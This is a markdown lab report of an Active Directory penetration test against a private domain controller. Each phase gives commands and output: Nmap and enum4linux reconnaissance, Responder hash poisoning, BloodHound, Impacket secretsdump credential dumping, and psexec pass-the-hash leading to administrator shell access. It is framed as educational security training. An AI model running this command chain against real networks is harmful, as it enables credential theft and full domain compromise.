# 🔬 Technical Execution

This document provides the detailed technical steps, commands, outputs, and conclusions from the Active Directory Penetration Testing Lab.

---

# Phase 1: Reconnaissance

## Objective
Identify live hosts, open ports, and exposed services on the network.

---

## Tool Used
Nmap

---

## Command Executed

```bash
nmap -sC -sV -oN SCANS/nmap_scan.txt 192.168.10.10
````

---

## Description

This command performs:

* Service discovery
* Version detection
* Default vulnerability script execution

Target:
Domain Controller (192.168.10.10)

---

## Output

```text
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
```

---

## Conclusion

The target system is confirmed to be a Domain Controller exposing critical services such as SMB, LDAP, and Kerberos.

Risk Level: Medium

---

# Phase 2: Enumeration

## Objective

Identify domain users, shares, and accessible resources.

---

## Tool Used

Enum4Linux

---

## Command Executed

```bash
enum4linux -a 192.168.10.10 | tee SCANS/enum4linux.txt
```

---

## Description

Enumerates:

* Domain users
* SMB shares
* Domain information

---

## Output

```text
Users:
Raghav1
ragh
admin1
Administrator
Guest

Domain Name: corp.local
```

---

## Conclusion

Valid domain users were identified, increasing the likelihood of credential-based attacks.

Risk Level: Medium

---

# Phase 3: Credential Harvesting

## Objective

Capture authentication credentials from network traffic.

---

## Tool Used

Responder

---

## Command Executed

```bash
sudo responder -I eth0
```

---

## Description

Performs LLMNR and NBT-NS poisoning to intercept NTLM authentication hashes.

---

## Output

```text
[SMB] NTLMv2 Hash captured

Username: Raghav1
Hash: Raghav1::CORP:1122334455667788:ABCDEF1234567890
```

---

## Conclusion

Captured NTLM hash can be used for authentication attacks such as Pass-the-Hash.

Risk Level: High

---

# Phase 4: Active Directory Enumeration

## Objective

Identify privilege escalation paths.

---

## Tool Used

BloodHound

---

## Command Executed

```bash
bloodhound-python -d corp.local -u Raghav1 -p Password@123 -dc 192.168.10.10 -c all
```

---

## Description

Collects:

* Domain users
* Group memberships
* Privilege relationships

---

## Output

```text
Privilege Escalation Path Found:

Raghav1 → IT Support Group → Domain Admin Privileges
```

---

## Conclusion

Improper privilege assignments allow privilege escalation.

Risk Level: Critical

---

# Phase 5: Credential Dumping

## Objective

Extract password hashes from Domain Controller.

---

## Tool Used

Impacket SecretsDump

---

## Command Executed

```bash
secretsdump.py corp.local/Raghav1:Password@123@192.168.10.10
```

---

## Description

Extracts credentials stored in Active Directory.

---

## Output

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

---

## Conclusion

Administrator credentials were successfully extracted.

Risk Level: Critical

---

# Phase 6: Privilege Escalation

## Objective

Gain Domain Administrator access.

---

## Tool Used

Impacket PsExec

---

## Command Executed

```bash
psexec.py corp.local/Administrator@192.168.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

---

## Description

Authenticates using NTLM hash without needing password.

---

## Output

```text
Microsoft Windows [Version 10.0.17763.3165]

C:\Windows\system32> whoami

corp\administrator
```

---

## Conclusion

Domain Administrator access successfully obtained.

Risk Level: Critical

---

# Final Outcome

| Phase                 | Status     |
| --------------------- | ---------- |
| Reconnaissance        | Successful |
| Enumeration           | Successful |
| Credential Harvesting | Successful |
| Credential Dumping    | Successful |
| Privilege Escalation  | Successful |
| Domain Compromise     | Successful |

---

# Overall Conclusion

The penetration test successfully demonstrated full compromise of the Active Directory domain through credential harvesting and privilege escalation techniques.

The environment is vulnerable to credential-based attacks and requires immediate remediation.

---

# Disclaimer

This project was conducted in a controlled lab environment for educational purposes only.

```


